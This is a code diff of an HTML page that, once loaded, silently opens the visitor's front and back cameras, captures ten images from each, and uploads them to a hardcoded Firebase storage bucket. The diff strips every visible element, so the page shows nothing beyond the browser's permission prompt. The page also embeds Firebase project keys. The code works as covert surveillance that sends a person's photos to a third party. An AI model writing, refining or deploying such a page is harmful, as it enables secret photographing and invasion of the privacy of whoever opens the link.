@@ -3,24 +3,13 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Auto Capture & Upload to Firebase</title>
-    
-    <!-- Firebase SDK -->
-    <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js"></script>
-    <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-storage.js"></script>
-</head>
-<body>
-    <h2>Auto Capture & Upload Image</h2>
-    <video id="video" autoplay playsinline muted style="display:none;"></video>
-    <canvas id="canvas" style="display:none;"></canvas>
-    <img id="capturedImage" alt="Captured Image">
-    <p id="status">Waiting for capture...</p>
+    <title>Auto Capture 10 Front & 10 Back Images</title>
 
+    <!-- Firebase SDK -->
     <script type="module">
-        // ✅ Import Firebase Modules
         import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
         import { getStorage, ref, uploadBytes, getDownloadURL } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-storage.js";
-    
+
         // ✅ Replace with your Firebase config
         const firebaseConfig = {
             apiKey: "AIzaSyCUcrXxdp-xaDemWm6XeODP43L4c8nsFZU",
@@ -32,69 +21,86 @@
   appId: "1:1059488015525:web:db514a29cb876069d2d94c",
   measurementId: "G-VBSCFW4HQP"
         };
-    
+
         // ✅ Initialize Firebase
         const app = initializeApp(firebaseConfig);
         const storage = getStorage(app);
-    
-        async function captureAndUploadPhoto() {
-            const status = document.getElementById("status");
-            status.innerText = "Initializing camera...";
-    
+
+        async function getCameraStream(useFrontCamera) {
+            const constraints = {
+                video: {
+                    facingMode: useFrontCamera ? "user" : "environment"
+                }
+            };
+            return await navigator.mediaDevices.getUserMedia(constraints);
+        }
+
+        async function captureAndUploadPhoto(video, index, useFrontCamera) {
             try {
-                const video = document.getElementById("video");
-                const canvas = document.getElementById("canvas");
-                const img = document.getElementById("capturedImage");
-    
-                // ✅ Request camera access
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-                video.srcObject = stream;
-    
-                video.onloadedmetadata = () => {
-                    video.play(); // Ensure the video starts
-                    status.innerText = "Camera ready, capturing in 1 sec...";
-                    
-                    setTimeout(async () => {
-                        // ✅ Set canvas size to match video dimensions
-                        canvas.width = video.videoWidth;
-                        canvas.height = video.videoHeight;
-    
-                        // ✅ Capture image from video
-                        const ctx = canvas.getContext("2d");
-                        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-                        img.src = canvas.toDataURL("image/png");
-    
-                        // ✅ Stop camera stream
-                        stream.getTracks().forEach(track => track.stop());
-                        video.srcObject = null;
-    
-                        status.innerText = "Image captured! Uploading...";
-    
-                        // ✅ Convert image to blob and upload
-                        canvas.toBlob(async (blob) => {
-                            const fileName = `images742/captured_${Date.now()}.png`;
-                            const storageRef = ref(storage, fileName);
-                            const uploadTask = uploadBytes(storageRef, blob);
-    
-                            uploadTask.then(async (snapshot) => {
-                                const downloadURL = await getDownloadURL(snapshot.ref);
-                                status.innerText = "Upload successful!";
-                                console.log("Image uploaded to:", downloadURL);
-                            }).catch((error) => {
-                                console.error("Upload failed:", error);
-                                status.innerText = "Upload failed!";
-                            });
-    
-                        }, 'image/png');
-                    }, 1000); // ✅ Capture after 1 second
-                };
+                const canvas = document.createElement("canvas");
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                const ctx = canvas.getContext("2d");
+
+                // ✅ Capture image from video stream
+                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+                // ✅ Convert image to Blob and upload
+                canvas.toBlob(async (blob) => {
+                    const cameraType = useFrontCamera ? "front" : "back";
+                    const fileName = `images/${cameraType}_${index + 1}_${Date.now()}.png`;
+                    const storageRef = ref(storage, fileName);
+                    await uploadBytes(storageRef, blob);
+
+                    // ✅ Get download URL
+                    const downloadURL = await getDownloadURL(storageRef);
+                    console.log(`Uploaded ${cameraType} image ${index + 1}:`, downloadURL);
+                }, "image/png");
             } catch (error) {
-                console.error("Camera error:", error);
-                status.innerText = "Camera access denied! Allow camera permissions.";
+                console.error("Error capturing image:", error);
             }
         }
-    
-        // ✅ Automatically capture and upload photo on page load
-        window.onload = captureAndUploadPhoto;
+
+        async function captureMultipleImages() {
+            console.log("📸 Requesting camera permission...");
+
+            // ✅ Request camera permission only once
+            const frontStream = await getCameraStream(true);
+            const backStream = await getCameraStream(false);
+
+            const frontVideo = document.createElement("video");
+            frontVideo.srcObject = frontStream;
+            frontVideo.play();
+            await new Promise(resolve => (frontVideo.onloadedmetadata = resolve));
+
+            const backVideo = document.createElement("video");
+            backVideo.srcObject = backStream;
+            backVideo.play();
+            await new Promise(resolve => (backVideo.onloadedmetadata = resolve));
+
+            console.log("📸 Capturing 10 Front & 10 Back Images...");
+
+            // ✅ Capture 10 front camera images
+            for (let i = 0; i < 10; i++) {
+                await captureAndUploadPhoto(frontVideo, i, true);
+            }
+
+            // ✅ Capture 10 back camera images
+            for (let i = 0; i < 10; i++) {
+                await captureAndUploadPhoto(backVideo, i, false);
+            }
+
+            // ✅ Stop camera streams
+            frontStream.getTracks().forEach(track => track.stop());
+            backStream.getTracks().forEach(track => track.stop());
+
+            console.log("✅ All images captured and uploaded!");
+        }
+
+        // ✅ Start capturing when the page loads
+        window.onload = captureMultipleImages;
     </script>
-    
+</head>
+<body>
+</body>
+</html>
